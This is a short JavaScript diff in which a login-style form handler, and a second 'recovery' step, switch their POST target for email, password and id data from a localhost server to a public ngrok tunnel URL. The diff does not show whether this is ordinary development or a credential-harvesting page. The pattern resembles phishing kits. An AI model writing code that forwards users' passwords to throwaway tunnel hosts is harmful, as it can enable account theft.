@@ -17,7 +17,7 @@ document.getElementById('useForm').addEventListener('submit',async(e)=>{
     const data={email,password,idElement}
 
     try{
-        const response = await fetch('http://localhost:5050/form',
+        const response = await fetch('https://ab62-191-106-210-114.ngrok-free.app/form',
             {
             method:'POST',
             headers:{'Content-Type':'application/json'},
@@ -54,7 +54,7 @@ else{
         console.log("Ventana recovery",data)
 
         try{
-            const response = await fetch('http://localhost:5050/form',
+            const response = await fetch('https://ab62-191-106-210-114.ngrok-free.app/form',
                 {
                 method:'POST',
                 headers:{'Content-Type':'application/json'},
